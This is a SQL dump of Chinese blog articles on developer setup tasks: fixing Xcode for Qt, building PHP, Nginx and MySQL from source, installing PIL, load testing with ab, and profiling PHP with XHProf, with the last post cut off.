(400, 'Mac OS 10.10安装QT后Xcode not set up properly', '在Mac OS10.10上安装Qt5，因为仅仅安装了Xcode6-Beta，因此，加载项目的时候提示错误\r\n\r\n```bash\r\nXcode not set up properly. You may need to confirm the license agreement...\r\n```\r\n\r\n解决方案：\r\n\r\n执行以下命令\r\n```bash\r\nsudo xcode-select -switch /Applications/Xcode6-Beta.app/Contents/Developer\r\n```\r\n\r\n该命令修改Xcode的开发目录为`/Applications/Xcode6-Beta.app/Contents/Developer`。\r\n\r\n```bash\r\nUsage: xcode-select [options]\r\n\r\nPrint or change the path to the active developer directory. This directory\r\ncontrols which tools are used for the Xcode command line tools (for example, \r\nxcodebuild) as well as the BSD development commands (such as cc and make).\r\n\r\nOptions:\r\n  -h, --help                  print this help message and exit\r\n  -p, --print-path            print the path of the active developer directory\r\n  -s <path>, --switch <path>  set the path for the active developer directory\r\n  --install                   open a dialog for installation of the command line developer tools\r\n  -v, --version               print the xcode-select version\r\n  -r, --reset                 reset to the default command line tools path\r\n```', '在Mac OS10.10上安装Qt5，因为仅仅安装了Xcode6-Beta，因此，加载项目的时候提示错误Xcode not set up properly. You may need to confirm the license agreement...', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/f7248ee74d34bf77b32b89df77be803b.jpeg', 'mylxsw', '原创', 1, 0, 1416796780, NULL, NULL, 'markdown'),
(401, '从零搭建LNMP环境(一) - 编译源码安装PHP', '我们使用[vagrant](https://www.vagrantup.com/)建立虚拟环境，这里使用"chef/centos-6.5"这个box，这个box是一个比较纯净的CentOS-6.5系统。\r\n关于Vagrant如何使用，请参考[Vagrant快速入门](http://aicode.cc/article/377.html)。\r\n\r\n```bash\r\n$ vagrant init chef/centos-6.5\r\n$ vagrant up\r\n```\r\n执行上述命令之后，就已经建立了一个centos-6.5的虚拟机并且启动了，这时我们使用命令`ssh`连接到虚拟机。\r\n\r\n```bash\r\n$ vagrant ssh\r\n```\r\n提示符变成了`[vagrant@localhost ~]$ ` ，说明成功连接到了虚拟机。接下来，我们就可以开始PHP开发环境的安装配置了。\r\n\r\n> 如果不使用vagrant，可以自己安装一个CentOS系统或者是虚拟机，以下步骤与vagrant没有直接关系。\r\n\r\n####编译源码安装PHP\r\n\r\n首先，下载PHP安装文件，我们使用源码编译安装 **PHP 5.4.35**，到[PHP官网](http://php.net/downloads.php)下载PHP安装文件。\r\n\r\n```bash\r\n$ wget http://jp1.php.net/distributions/php-5.4.35.tar.gz\r\n$ tar -zxvf php-5.4.35.tar.gz\r\n$ cd php-5.4.35\r\n```\r\n\r\n接下来对PHP源码进行编译安装，进入到源码目录之后，执行下列命令安装：\r\n\r\n> 注意，如果需要mysql的话，最好是在变异的时候就提供参数并且指定为使用mysqlnd库，否则单独编译\r\n> 扩展的形式安装只能使用MySQL Client Library。\r\n\r\n```bash\r\n$ ./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --with-iconv-dir --with-freetype-dir --with-jpeg-dir --with-png-dir --with-zlib --with-libxml-dir=/usr --enable-xml --disable-rpath --enable-bcmath --enable-shmop --enable-sysvsem --enable-inline-optimization --with-curl --with-curlwrappers --enable-mbregex --enable-fpm --enable-mbstring --with-mcrypt --enable-ftp --with-gd --enable-gd-native-ttf --with-openssl --with-mhash --enable-pcntl --enable-sockets --with-xmlrpc --enable-zip --enable-soap --with-gettext --with-mysql=mysqlnd --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd\r\n```\r\n\r\n执行上述命令之后，提示如下错误:\r\n```bash\r\nconfigure: error: no acceptable C compiler found in $PATH\r\n```\r\n\r\n这是因为没有安装gcc编译器，我们需要先安装gcc。\r\n```bash\r\n$ sudo yum install gcc\r\n```\r\n\r\n安装之后，重新编译，这次出现了新的错误：\r\n```bash\r\nconfigure: error: xml2-config not found. Please check your libxml2 installation.\r\n```\r\n\r\n提示找不到`libxml2`，没问题，安装一下就行了。\r\n```bash\r\n$ sudo yum install libxml2-devel\r\n```\r\n\r\n继续重新编译，编译安装的过程就是不断解决问题的过程，每次遇到问题，我们去解决问题，没有什么是能难道我们的！\r\n```bash\r\nconfigure: error: Cannot find OpenSSL\\''s <evp.h>\r\n```\r\n\r\n因为我们启用了`--with-openssl`，因此，我们需要安装`openssl-devel`。\r\n```bash\r\n$ sudo yum install openssl-devel\r\n```\r\n\r\n再次编译，提示\r\n```bash\r\nconfigure: error: Please reinstall the libcurl distribution -\r\n    easy.h should be in <curl-dir>/include/curl/\r\n```\r\n\r\n错误已经说明了，安装一下`libcurl`\r\n```bash\r\n$ sudo yum install libcurl-devel\r\n```\r\n\r\n继续编译，我们还会遇到如下错误\r\n```bash\r\nconfigure: error: jpeglib.h not found.\r\n```\r\n\r\n因为我们的编译参数中提供了对GD库的支持，因此需要安装以下几个库。\r\n```bash\r\n$ sudo yum install libjpeg libjpeg-devel\r\n$ sudo yum install libpng libpng-devel\r\n$ sudo yum install freetype freetype-devel\r\n```\r\n\r\n安装了这么多lib，总该成功了吧，再次编译，悲剧的是，又报错了：\r\n```bash\r\nconfigure: error: mcrypt.h not found. Please reinstall libmcrypt.\r\n```\r\n\r\n我们还需要安装`libmcrypt`，这个lib在yum中是没有的，因此需要下载下来，手动编译。\r\n```bash\r\n$ wget ftp://mcrypt.hellug.gr/pub/crypto/mcrypt/libmcrypt/libmcrypt-2.5.7.tar.gz\r\n$ tar -zxvf libmcrypt-2.5.7.tar.gz\r\n$ cd libmcrypt-2.5.7\r\n$ ./configure\r\n$ make\r\n$ sudo make install\r\n```\r\n\r\n好了，我们再编译一次，这次一定要成功了，再不成功就不玩了。。。幸运的是，这次`configure`成功，\r\n一鼓作气，编译安装：\r\n```bash\r\n$ make\r\n$ sudo make install\r\n```\r\n一切都顺利的话，我们已经成功编译并且安装了PHP，安装目录在`/usr/local/php`。\r\n\r\n最后，我们需要提供php的配置文件`php.ini`。\r\n```bash\r\n$ sudo cp php.ini-development  /usr/local/php/etc/php.ini\r\n$ sudo mv /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf\r\n```\r\n\r\n> PHP的安装目录由`configure`的`--prefix=目录`参数指定。另外，这里我们搭建的是用于开发的环境，\r\n> 如果需要作为生产环境，则需要注意一些安全性问题，同时，建议不要拷贝`php.ini-development`文件了，\r\n> 而是拷贝`php.ini-production`文件。\r\n\r\n查看一下PHP的版本：\r\n```bash\r\n$ /usr/local/php/bin/php --version\r\nPHP 5.4.35 (cli) (built: Nov 25 2014 08:23:11)\r\nCopyright (c) 1997-2014 The PHP Group\r\nZend Engine v2.4.0, Copyright (c) 1998-2014 Zend Technologies\r\n```\r\n\r\n为了操作方便，可以将php的`bin`目录添加到环境变量。编辑`~/.bash_profile`，\r\n在`export PATH`上面添加下面一行内容：\r\n```bash\r\nPATH=$PATH:/usr/local/php/bin\r\n```\r\n\r\n然后执行如下命令\r\n```bash\r\n$ source ~/.bash_profile\r\n```\r\n\r\n这样，我们就可以直接使用命令，而不需要添加目录了。\r\n\r\n> 小技巧：如何查看PHP使用的是哪个配置文件?\r\n```bash\r\n$ strace -e open php 2>&1 |grep php.ini\r\nopen("/usr/local/php/bin/php.ini", O_RDONLY) = -1 ENOENT (No such file or directory)\r\nopen("/usr/local/php/etc/php.ini", O_RDONLY) = 3\r\n```\r\n> 如果没有安装`strace`命令，使用`yum install strace` 安装即可。\r\n\r\n####安装扩展\r\n安装完成基本的PHP了，接下来我们需要安装一些符合业务需要的扩展。\r\n\r\n#####安装yaf开发框架扩展\r\n执行以下命令，使用pecl进行安装：\r\n```bash\r\n$ sudo /usr/local/php/bin/pecl install yaf\r\n```\r\n\r\n不出意外的话，上述命令足以完成yaf的安装，接下来，需要在`php.ini`文件中启用yaf扩展。\r\n编辑`/usr/local/php/etc/php.ini`，加入以下内容\r\n```bash\r\nextension=yaf.so\r\n```\r\n\r\n#####安装mysql和mysqli扩展\r\n\r\n安装mysql相关扩展，推荐使用mysqlnd库，但是找了半天，实在是没有找到好的办法单独编译mysql扩展使用\r\nmysqlnd库，最后在文档中看到下面这段内容：\r\n```bash\r\nThe MySQL database extensions must be configured to use the MySQL Client Library. In order to use the MySQL Native Driver, PHP needs to be built specifying that the MySQL database extensions are compiled with MySQL Native Driver support. This is done through configuration options prior to building the PHP source code.\r\n```\r\n\r\n这里说的是如果安装mysql扩展的话，只能使用MySQL Client Library（百度/谷歌有好多安装教程）。如果希望使用mysqlnd库的话，\r\n只能在编译PHP的时候指定。因此，好像是只能重新编译PHP了。如果你有好的办法，可以交流交流。\r\n\r\n#####安装eAccelerator扩展\r\n\r\n```bash\r\n$ wget https://github.com/eaccelerator/eaccelerator/archive/master.zip -O eaccelerator.zip\r\n$ sudo yum install unzip\r\n$ unzip eaccelerator.zip\r\n$ cd eaccelerator-master/\r\n$ phpize\r\n$ ./configure --enable-shared\r\n$ make\r\n$ sudo make install\r\n```\r\n\r\n在php.ini中增加eAccelerator的配置信息:\r\n```bash\r\nzend_extension="/usr/local/php/lib/php/extensions/no-debug-non-zts-20100525/eaccelerator.so"\r\neaccelerator.shm_size="16"\r\neaccelerator.cache_dir="/tmp/eaccelerator"\r\neaccelerator.enable="1"\r\neaccelerator.optimizer="1"\r\neaccelerator.check_mtime="1"\r\neaccelerator.debug="0"\r\neaccelerator.filter=""\r\neaccelerator.shm_ttl="0"\r\neaccelerator.shm_prune_period="0"\r\neaccelerator.shm_only="0"\r\n```\r\n\r\n执行`php -v`可以看到\r\n```bash\r\n$ php -v\r\nPHP 5.4.35 (cli) (built: Nov 25 2014 10:40:18)\r\nCopyright (c) 1997-2014 The PHP Group\r\nZend Engine v2.4.0, Copyright (c) 1998-2014 Zend Technologies\r\n    with eAccelerator v1.0-dev, Copyright (c) 2004-2012 eAccelerator, by eAccelerator\r\n```\r\n\r\n#####安装Xdebug扩展\r\n\r\n```bash\r\n$ wget http://github.com/xdebug/xdebug/archive/master.zip -O xdebug.zip\r\n$ unzip xdebug.zip\r\n$ cd xdebug-master\r\n$ /usr/local/php/bin/phpize\r\n$ ./configure --enable-xdebug\r\n$ make\r\n$ sudo make install\r\n```\r\n\r\n接下来配置php.ini，加入该扩展\r\n```bash\r\nzend_extension="/usr/local/php/lib/php/extensions/no-debug-non-zts-20100525/xdebug.so"\r\nxdebug.remote_enable=1\r\nxdebug.remote_host=localhost\r\nxdebug.remote_port=9000\r\nxdebug.remote_connect_back=1\r\n;xdebug.remote_autostart=1\r\n```\r\n\r\n#####安装OpCache扩展\r\n因为eAccelerator已经没人维护好长时间了，所以，可以考虑使用OpCache。\r\n\r\n```bash\r\n$ wget http://pecl.php.net/get/zendopcache-7.0.3.tgz\r\n$ tar -zxvf zendopcache-7.0.3.tgz\r\n$ cd zendopcache-7.0.3\r\n$ phpize\r\n$ make\r\n$ sudo make install\r\n```\r\n\r\n接下来需要配置php.ini，启用该扩展。\r\n\r\n> 注意：如果与XDebug一起使用的话，需要确保OpCache在Xdebug之前加载。\r\n\r\n```bash\r\nzend_extension="/usr/local/php/lib/php/extensions/no-debug-non-zts-20100525/opcache.so"\r\nopcache.memory_consumption=128\r\nopcache.interned_strings_buffer=8\r\nopcache.max_accelerated_files=4000\r\nopcache.revalidate_freq=60\r\nopcache.fast_shutdown=1\r\nopcache.enable_cli=1\r\n```', '我们使用vagrant建立虚拟环境，这里使用"chef/centos-6.5"这个box，这个box是一个比较纯净的CentOS-6.5系统。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/d5893a603091a4f983ed6c4c5d73c71d.gif', 'mylxsw', '原创', 1, 0, 1416990063, 1417060526, 0, 'markdown'),
(402, '从零搭建LNMP环境(二) - 集成Nginx与PHP', '安装Nginx的方式有很多种，这里我们还是编译源码进行安装，使用下列命令：\r\n```bash\r\n$ wget http://nginx.org/download/nginx-1.6.2.tar.gz\r\n$ tar -zxvf nginx-1.6.2.tar.gz\r\n$ cd nginx-1.6.2\r\n$ ./configure --prefix=/usr/local/nginx\r\n$ make\r\n$ sudo make install\r\n```\r\n\r\n如果安装过程中出现如下错误\r\n```bash\r\n./configure: error: the HTTP rewrite module requires the PCRE library.\r\nYou can either disable the module by using --without-http_rewrite_module\r\noption, or install the PCRE library into the system, or build the PCRE library\r\nstatically from the source with nginx by using --with-pcre=<path> option.\r\n```\r\n\r\n则需要先安装pcre\r\n```bash\r\n$ sudo yum install pcre-devel\r\n```\r\n\r\n安装完成之后，我们的Nginx安装目录在`/usr/local/nginx`。\r\n接下来修改nginx的配置文件(/usr/local/nginx/conf/nginx.conf)，使其能够处理php脚本。\r\n\r\n```\r\nworker_processes  1;\r\n\r\nevents {\r\n  worker_connections  1024;\r\n}\r\nhttp {\r\n  include       mime.types;\r\n  default_type  application/octet-stream;\r\n  sendfile        on;\r\n  keepalive_timeout  65;\r\n  server {\r\n    listen       80;\r\n    server_name  _;\r\n    root /vagrant;\r\n\r\n    location / {\r\n      index  index.html index.htm index.php;\r\n    }\r\n\r\n    location /demo {\r\n      index index.php;\r\n      if (!-e $request_filename) {\r\n          rewrite ^/demo/(.*)$ /demo/index.php?$1 last;\r\n          break;\r\n      }\r\n    }\r\n\r\n    error_page   500 502 503 504  /50x.html;\r\n    location = /50x.html {\r\n      root   html;\r\n    }\r\n\r\n    location ~ \\.php$ {\r\n      fastcgi_pass   127.0.0.1:9000;\r\n      fastcgi_index  index.php;\r\n      fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\r\n      include        fastcgi_params;\r\n    }\r\n  }\r\n}\r\n\r\n```\r\n\r\n最后，启动Nginx时，需要先启动PHP-FPM。\r\n```bash\r\n$ sudo /usr/local/php/sbin/php-fpm\r\n$ sudo /usr/local/nginx/sbin/nginx\r\n```\r\n\r\n对于Nginx的重启以及关闭操作，可以使用以下命令\r\n```bash\r\n$ sudo /usr/local/nginx/sbin/nginx -s [reload|restart|stop]\r\n```\r\n\r\n而PHP-FPM，则麻烦一点，需要先使用`ps -ef|grep php-fpm`获取**master process**的进程ID，\r\n再使用`kill -USR2`:\r\n```bash\r\n$ ps -ef|grep php-fpm\r\n\r\nroot      6221     1  0 02:17 ?        00:00:00 php-fpm: master process (/usr/local/php/etc/php-fpm.conf)\r\nnobody    6222  6221  0 02:17 ?        00:00:00 php-fpm: pool www\r\nnobody    6223  6221  0 02:17 ?        00:00:00 php-fpm: pool www\r\nvagrant   6233  1623  0 02:18 pts/0    00:00:00 grep php-fpm\r\n\r\n$ sudo kill -USR2 6221\r\n```\r\n\r\n> 注意: `-USR2`参数为重启，`-INT`参数为关闭。', '安装Nginx的方式有很多种，这里我们还是编译源码进行安装。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/d5893a603091a4f983ed6c4c5d73c71d.gif', 'mylxsw', '原创', 1, 0, 1416990290, NULL, NULL, 'markdown'),
(403, '从零搭建LNMP环境(三) - 安装MySQL数据库服务器', '废话不多说，虽然可以通过yum直接安装MySQL，但是为了能够对安装过程有一个比较清晰的认识，\r\n我们这里还是使用源码编译安装。\r\n```bash\r\n$ wget http://dev.mysql.com/get/Downloads/MySQL-5.6/mysql-5.6.21.tar.gz\r\n$ tar -zxvf mysql-5.6.21.tar.gz\r\n$ cd mysql-5.6.21\r\n```\r\n\r\n文件已经下载并且解压好了，在安装之前，我们需要为mysql建立名为`mysql`的用户名和用户组。\r\n```bash\r\n$ sudo groupadd mysql\r\n$ sudo useradd -r -g mysql mysql\r\n```\r\n\r\n建立好用户名和组之后，就可以进行编译安装了\r\n```bash\r\n$ cmake .\r\n$ make\r\n$ sudo make install\r\n```\r\n\r\n> 编译过程比较漫长，耐心一点\r\n\r\n如果没有安装cmake，则需要先安装\r\n```bash\r\n$ sudo yum install cmake\r\n$ sudo yum install gcc-c++\r\n```\r\n\r\n如果提示\r\n```bash\r\nWarning: Bison executable not found in PATH\r\n```\r\n则需要安装bison\r\n```bash\r\n$ sudo yum install bison\r\n```\r\n\r\n如果出现以下错误\r\n```bash\r\n-- Could NOT find Curses (missing:  CURSES_LIBRARY CURSES_INCLUDE_PATH)\r\nCMake Error at cmake/readline.cmake:85 (MESSAGE):\r\n  Curses library not found.  Please install appropriate package,\r\n\r\n      remove CMakeCache.txt and rerun cmake.On Debian/Ubuntu, package name is libncurses5-dev, on Redhat and derivates it is ncurses-devel.\r\n```\r\n则需要安装\r\n```bash\r\n$ sudo yum install ncurses-devel\r\n```\r\n\r\n经过漫长的编译过程，我们的mysql终于安装到了`/usr/local/mysql`目录，接下来，我们需要对mysql\r\n进行相应的配置，使得mysql变得可用。\r\n```bash\r\n$ cd /usr/local/mysql/\r\n$ sudo chown -R mysql .\r\n$ sudo chgrp -R mysql .\r\n$ sudo scripts/mysql_install_db --user=mysql\r\n```\r\n\r\n这里的`mysql_install_db`脚本只有在手动编译安装mysql的时候需要，该脚本为mysql建立了授权表。\r\n\r\n> 大多数的mysql安装是属于root用户的，但是必须保证data目录是数据mysql用户。\r\n```bash\r\n$ sudo chown -R root .\r\n$ sudo chown -R mysql data\r\n```\r\n\r\n最后，我们需要创建mysql的配置文件\r\n```bash\r\n$ sudo cp support-files/my-default.cnf /etc/my.cnf\r\n```\r\n\r\n####配置MySQL开机启动\r\n如果希望在系统启动的时候mysql也能够自动的启动，可以执行下面的命令\r\n```bash\r\n$ sudo cp support-files/mysql.server /etc/init.d/mysql.server\r\n$ sudo chmod u+x /etc/init.d/mysql.server\r\n$ sudo chkconfig --add mysql.server\r\n```\r\n\r\n执行`chkconfig |grep mysql`看到如下，特别是运行级别3为启用，则说明设置成功。\r\n```bash\r\n$ chkconfig |grep mysql\r\nmysql.server   	0:关闭	1:关闭	2:启用	3:启用	4:启用	5:启用	6:关闭\r\n```\r\n\r\n可以通过`mysql.server`脚本启动和关闭mysql。\r\n```bash\r\n$ sudo /etc/init.d/mysql.server [start|stop]\r\n```\r\n\r\n如果要手动操作的话，启动mysql的话使用命令:\r\n```bash\r\n$ sudo /usr/local/mysql/bin/mysqld_safe --user=mysql &\r\n```\r\n\r\n关闭mysql:\r\n```bash\r\n$ ./mysqladmin -u root shutdown\r\n```\r\n\r\n####修改root账号密码\r\n\r\n新安装的mysql数据库的root账号是没有设置密码的，因此，所有人都可以进行访问，为了安全起见，\r\n我们需要为root账号设置一个密码。\r\n\r\n```bash\r\n$ /usr/local/mysql/bin/mysql -uroot\r\nmysql> SELECT User, Host, Password FROM mysql.user;\r\n+------+-----------------------+----------+\r\n| User | Host                  | Password |\r\n+------+-----------------------+----------+\r\n| root | localhost             |          |\r\n| root | localhost.localdomain |          |\r\n| root | 127.0.0.1             |          |\r\n| root | ::1                   |          |\r\n|      | localhost             |          |\r\n|      | localhost.localdomain |          |\r\n+------+-----------------------+----------+\r\n6 rows in set (0.00 sec)\r\n```\r\n\r\n> 这里User一列为空的是匿名用户信息，使用`mysql`直接登陆的时候，没有提供账号的话，\r\n> 就会以该用户的身份登陆数据库，如果不需要该用户的话，可以删除掉该用户信息。\r\n```bash\r\nmysql> DROP USER ''''@''localhost'';\r\nmysql> DROP USER ''''@''localhost.localdomain'';\r\n```\r\n\r\n通常我们有三种方式为mysql用户设置密码：\r\n\r\n第一种方式是使用`SET PASSWORD`，使用该指令，我们需要登陆到mysql。\r\n```bash\r\nmysql> SET PASSWORD FOR ''root''@''localhost'' = PASSWORD(''root'');\r\nQuery OK, 0 rows affected (0.00 sec)\r\n\r\nmysql> SET PASSWORD FOR ''root''@''127.0.0.1'' = PASSWORD(''root'');\r\nQuery OK, 0 rows affected (0.00 sec)\r\n\r\nmysql> SET PASSWORD FOR ''root''@''::1'' = PASSWORD(''root'');\r\nQuery OK, 0 rows affected (0.00 sec)\r\n```\r\n\r\n第二种方式更加直接，使用`UPDATA`直接修改数据表。\r\n```bash\r\nmysql> UPDATE mysql.user SET Password = PASSWORD(''root'') WHERE User = ''root'';\r\nQuery OK, 1 row affected (0.00 sec)\r\nRows matched: 4  Changed: 1  Warnings: 0\r\n\r\nmysql> FLUSH PRIVILEGES;\r\nQuery OK, 0 rows affected (0.00 sec)\r\n```\r\n\r\n这里的`FLUSH`语句让数据库重新加载授权表，否则需要等下次重启才能生效。\r\n\r\n第三种方式是使用`mysqladmin`命令，不过这种方式不能为`''root''@''127.0.0.1''`和`''root''@''::1''`\r\n修改密码。\r\n```bash\r\nshell> mysqladmin -u root password "newpwd"\r\nshell> mysqladmin -u root -h host_name password "newpwd"\r\n```', '废话不多说，虽然可以通过yum直接安装MySQL，但是为了能够对安装过程有一个比较清晰的认识，我们这里还是使用源码编译安装。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/d5893a603091a4f983ed6c4c5d73c71d.gif', 'mylxsw', '原创', 1, 0, 1416990352, NULL, NULL, 'markdown'),
(404, 'Mac安装Python图像处理库PIL', '开发平台是Mac，需要用到Python的图像处理库PIL，下面记录了安装过程以及出现的问题。\r\n\r\n基本安装过程是这样的，使用命令`pip`进行安装\r\n\r\n```bash\r\n$ pip install PIL\r\nDownloading/unpacking PIL\r\n  Could not find any downloads that satisfy the requirement PIL\r\n  Some externally hosted files were ignored (use --allow-external PIL to allow).\r\nCleaning up...\r\nNo distributions at all found for PIL\r\nStoring debug log for failure in /Users/mylxsw/.pip/pip.log\r\n```\r\n\r\n提示需要添加`--allow-external`参数 \r\n\r\n```bash\r\n$ pip2.7 install PIL --allow-external PIL\r\nDownloading/unpacking PIL\r\n  Could not find any downloads that satisfy the requirement PIL\r\n  Some insecure and unverifiable files were ignored (use --allow-unverified PIL to allow).\r\nCleaning up...\r\nNo distributions at all found for PIL\r\nStoring debug log for failure in /Users/mylxsw/.pip/pip.log\r\n```\r\n\r\n又报错了，提示需要添加`--allow-unverified`参数\r\n\r\n```bash\r\n$ pip2.7 install PIL --allow-external PIL --allow-unverified PIL\r\n...\r\n_imagingft.c:73:10: fatal error: ''freetype/fterrors.h'' file not found\r\n\r\n#include <freetype/fterrors.h>\r\n\r\n         ^\r\n\r\n1 error generated.\r\n...\r\n```\r\n\r\n提示缺少`freetype/fterrors.h`头文件，可是系统已经安装了，于是从stackoverflow上找到方案：\r\n\r\n```bash\r\n$ ln -s /usr/local/include/freetype2 /usr/local/include/freetype\r\n```\r\n\r\n再次安装\r\n```bash\r\n$ pip2.7 install PIL --allow-external PIL --allow-unverified PIL\r\nDownloading/unpacking PIL\r\n...\r\nSuccessfully installed PIL\r\nCleaning up...\r\n```\r\n\r\nOK!', '开发平台是Mac，需要用到Python的图像处理库PIL，下面记录了安装过程以及出现的问题。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/c1c51f882efa674fb6c2ed127bd46878.jpg', 'mylxsw', '原创', 1, 0, 1417772412, NULL, NULL, 'markdown');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(407, '使用ab工具对服务器进行压力测试', '`ab`是Apache服务器附带的用于基准测试的工具。\r\n\r\n在使用之前，需要先确认是否服务器安装了Apache Http Server，如果没有安装，则需要先安装：\r\n\r\n```bash\r\n$ sudo yum install httpd\r\n$ ab -V\r\nThis is ApacheBench, Version 2.3 <$Revision: 1430300 $>\r\nCopyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/\r\nLicensed to The Apache Software Foundation, http://www.apache.org/\r\n```\r\n\r\n下面是对`ab`工具比较常用的一些参数的解释\r\n\r\n```bash\r\naicode:~ mylxsw$ ab -h\r\nUsage: ab [options] [http[s]://]hostname[:port]/path\r\nOptions are:\r\n    -n requests     要执行的请求数量\r\n    -c concurrency  并发请求数量\r\n    -b windowsize   TCP发送/接收缓冲区大小，单位所以byte\r\n    -p postfile     指定POST发送的数据文件，不要忘记设置-T参数\r\n    -u putfile      指定PUT发送的数据文件，不要忘记设置-T参数\r\n    -T content-type 使用POST/PUT发送数据时，指定Content-type请求头，例如.\r\n                    ''application/x-www-form-urlencoded''\r\n                    默认是 ''text/plain''\r\n    -w              以HTML表格的形式输出结果\r\n    -i              请求方式使用HEAD代替GET\r\n    -C attribute    添加Cookie，例如''Apache=1234''. (可以重复设置)\r\n    -H attribute    添加任意的请求Header，例如. ''Accept-Encoding: gzip''(可重复设置)\r\n    -A attribute    添加基本的WWW认证信息，这个属性是用英文逗号分隔的用户名和密码\r\n    -P attribute    添加代理服务器认证信息，使用逗号分隔用户名和密码\r\n    -X proxy:port   指定代理服务器的地址和端口号\r\n    -k              使用HTTP的KeepAlive特性\r\n    -r              当Socket收到错误信息时不要退出.\r\n    -Z ciphersuite  指定SSL/TLS加密套件\r\n    -f protocol     指定SSL/TLS协议(SSL2, SSL3, TLS1 or ALL)\r\n    ...\r\n```\r\n\r\n假如我们需要对`http://letv.com`进行压力测试，指定请求总数为100，并发用户数为10，我们可以以下面的方式进行测试\r\n```bash\r\n$ ab -n 100 -c 10 http://letv.com/\r\nThis is ApacheBench, Version 2.3 <$Revision: 1430300 $>\r\nCopyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/\r\nLicensed to The Apache Software Foundation, http://www.apache.org/\r\n\r\nBenchmarking letv.com (be patient).....done\r\n\r\n\r\nServer Software:        nginx/1.2.1\r\nServer Hostname:        letv.com\r\nServer Port:            80\r\n\r\nDocument Path:          /\r\nDocument Length:        184 bytes\r\n\r\nConcurrency Level:      10\r\nTime taken for tests:   0.396 seconds\r\nComplete requests:      100\r\nFailed requests:        0\r\nWrite errors:           0\r\nNon-2xx responses:      100\r\nTotal transferred:      37300 bytes\r\nHTML transferred:       18400 bytes\r\nRequests per second:    252.29 [#/sec] (mean)\r\nTime per request:       39.637 [ms] (mean)\r\nTime per request:       3.964 [ms] (mean, across all concurrent requests)\r\nTransfer rate:          91.90 [Kbytes/sec] received\r\n\r\nConnection Times (ms)\r\n              min  mean[+/-sd] median   max\r\nConnect:        4    5   0.9      5       8\r\nProcessing:     4   33  87.4      6     312\r\nWaiting:        4   33  87.3      5     311\r\nTotal:          9   39  87.6     12     317\r\n\r\nPercentage of the requests served within a certain time (ms)\r\n  50%     12\r\n  66%     12\r\n  75%     13\r\n  80%     14\r\n  90%     15\r\n  95%    316\r\n  98%    317\r\n  99%    317\r\n 100%    317 (longest request)\r\n```\r\n\r\n需要注意的几个字段是\r\n\r\n- `Requests per second` 吞吐率（reqs/s），该字段值为252.29，该值表明了服务器每秒能够处理的请求数量。\r\n- `Time per request` 平均请求处理时间，可以看到，该字段分为两行，有两个不同的值，代表了处理每隔请求所需要的时间，但是第一行的值是第二行的10倍。这是因为我们指定的并发数量为10，第一行为每次并发请求的平均耗时，第二行为每隔请求的耗时，因此，第一行值为第二行的值乘上并发请求数量。可以尝试将并发数改为20，这样就会看到第一行是第二行的20倍。\r\n- `Transfer rate` 每秒从服务器获取的数据的长度。\r\n\r\n', 'ab是Apache服务器附带的用于基准测试的工具，本文讲述了使用ab工具对服务器进行压力测试的方法。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/8441da9038b0df225f25b6a409191e91.jpg', 'mylxsw', '原创', 1, 0, 1419074442, NULL, NULL, 'markdown'),
(408, '使用XHProf查找PHP性能瓶颈', 'XHProf是facebook 开发的一个测试php性能的扩展。\r\n\r\n####安装Xhprof扩展\r\n```bash\r\n$ wget http://pecl.php.net/get/xhprof-0.9.4.tgz\r\n$ tar -zxvf xhprof-0.9.4.tgz \r\n$ cd xhprof-0.9.4\r\n$ cd extension/\r\n$ phpize\r\n$ ./configure\r\n$ make\r\n$ sudo make install\r\n```\r\n\r\n修改`php.ini`\r\n\r\n```bash\r\n[xhprof]\r\nextension=xhprof.so\r\nxhprof.output_dir=/tmp\r\n```\r\n\r\n> 配置中`xhprof.output_dir`指定了生成的profile文件存储的位置，我们将其指定为/tmp。\r\n\r\n####对PHP进行性能分析\r\n\r\n在XHProf扩展中，一共提供了四个函数用于对PHP进行性能分析。\r\n\r\n`xhprof_enable/xhprof_sample_enable`函数用于开始XHProf性能分析，区别在于前者功能更加强大，而后者则是是以简单模式启动性能分析（简单记录了函数的调用栈信息），开销比较小。\r\n\r\n`xhprof_disable/xhprof_sample_disable`函数用于停止性能分析，并返回分析的数据。\r\n\r\n需要特别说明的函数是`xhprof_enable`，其他函数都是不需要提供参数的，而该函数则可以接受两个可选的参数，用于改变该工具的行为。\r\n\r\n```bash\r\nvoid xhprof_enable ([ int $flags = 0 [, array $options ]] )\r\n```\r\n\r\n- **flags** 该参数用于为剖析结果添加额外的信息，该参数的值使用以下宏，如果需要提供多个值，使用`|`进行分隔。\r\n	- XHPROF_FLAGS_NO_BUILTINS 跳过所有的内置函数\r\n	- XHPROF_FLAGS_CPU 添加对CPU使用的分析\r\n	- XHPROF_FLAGS_MEMORY 添加对内存使用的分析\r\n\r\n- **options** 数组形式提供可选参数，在此处提供`ignored_functions`选项需要忽略的函数\r\n\r\n比如下面的例子，同时对内存和CPU进行分析，并且忽略对`call_user_func`和`call_user_func_array`函数的分析。\r\n```php\r\nxhprof_enable(\r\n	XHPROF_FLAGS_MEMORY|XHPROF_FLAGS_CPU,\r\n    [\r\n    	''ignored_functions''	=> [\r\n        	''call_user_func'',\r\n            ''call_user_func_array''\r\n        ]\r\n    ]\r\n);\r\n\r\n// 这里是PHP代码，比如业务逻辑实现等要被分析的代码部分\r\n....\r\n\r\n$xhprofData = xhprof_disable();// $xhprofData是数组形式的分析结果\r\nprint_r($xhprofData);\r\n```\r\n\r\n> 